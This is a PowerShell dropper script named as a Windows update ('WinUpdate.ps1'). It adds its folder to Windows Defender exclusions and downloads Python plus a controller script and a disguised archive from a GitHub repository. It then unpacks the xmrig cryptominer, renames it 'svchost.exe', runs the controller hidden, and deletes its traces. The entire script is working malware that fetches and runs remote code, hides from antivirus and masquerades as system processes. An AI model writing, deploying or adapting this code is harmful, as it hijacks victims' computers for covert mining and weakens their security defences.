# --- THE GHOST MASTER (WinUpdate.ps1) ---
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$ProgressPreference = 'SilentlyContinue'
$ID = "svchost"
$Path = "$env:APPDATA\$ID"

Write-Host "`n[+] Shadow Engine: Initializing Deployment..." -ForegroundColor Cyan

# 1. Hard Reset & Blinding
if (Test-Path $Path) { 
    $OurProc = Get-Process -Name $ID -ErrorAction SilentlyContinue | Where-Object { $_.Path -like "*$Path*" }
    if ($OurProc) { Stop-Process -Id $OurProc.Id -Force -ErrorAction SilentlyContinue }
    Remove-Item -Path $Path -Recurse -Force -ErrorAction SilentlyContinue 
}
New-Item -ItemType Directory -Path $Path -Force | Out-Null
Add-MpPreference -ExclusionPath $Path -ErrorAction SilentlyContinue

# 2. Shadow Engine Setup
$PyUrl = "https://www.python.org/ftp/python/3.12.0/python-3.12.0-embed-amd64.zip"
Invoke-WebRequest -Uri $PyUrl -OutFile "$Path\py.zip"
Expand-Archive -Path "$Path\py.zip" -DestinationPath "$Path\python" -Force
Remove-Item "$Path\py.zip"

# --- LIBRARY BOOST ---
Get-ChildItem -Path "$Path\python" -Filter "*._pth" | Remove-Item -Force
$LibPath = "$Path\python\Lib\site-packages"
New-Item -ItemType Directory -Path $LibPath -Force | Out-Null
Invoke-WebRequest -Uri "https://bootstrap.pypa.io/get-pip.py" -OutFile "$Path\get-pip.py"
& "$Path\python\python.exe" "$Path\get-pip.py" --no-warn-script-location
& "$Path\python\python.exe" -m pip install requests psutil --target "$LibPath" --no-warn-script-location

# 3. Deployment (The Secret Identity Trick)
Write-Host "[+] Shadow Engine: Extracting Payloads..." -ForegroundColor Gray
$C_URL = "https://github.com/itzcurled/footbalhunt/raw/main/WinServices.py"
$Z_URL = "https://github.com/itzcurled/footbalhunt/raw/main/UpdataData.bin" # DOWNLOAD THE BIN

Invoke-WebRequest -Uri $C_URL -OutFile "$Path\WinServices.py"
Invoke-WebRequest -Uri $Z_URL -OutFile "$Path\UpdataData.bin"

if (Test-Path "$Path\UpdataData.bin") {
    # THE MAGIC TRICK: Flip the mask back to .zip so Windows can open it
    Rename-Item -Path "$Path\UpdataData.bin" -NewName "UpdataData.zip" -Force
    Expand-Archive -Path "$Path\UpdataData.zip" -DestinationPath $Path -Force
    
    $Miner = Get-ChildItem -Path $Path -Filter "xmrig.exe" -Recurse | Select-Object -First 1
    if ($Miner) { Move-Item -Path $Miner.FullName -Destination "$Path\$ID.exe" -Force }
}

# 4. Activation
$PY_EXEC = "$Path\python\pythonw.exe"
if (Test-Path $PY_EXEC) {
    $env:PYTHONPATH = $LibPath
    Start-Process -FilePath $PY_EXEC -ArgumentList "`"$Path\WinServices.py`" --id $ID" -WindowStyle Hidden
}

# 5. Final Cleanup
Remove-Item -Path "$Path\UpdataData.zip", "$Path\get-pip.py" -ErrorAction SilentlyContinue
Get-ChildItem -Path $Path -Directory | Where-Object { $_.Name -notin @("python", "pythonw") } | Remove-Item -Recurse -Force
Write-Host "[!] Setup Complete. Engine is running in the shadows.`n" -ForegroundColor Cyan
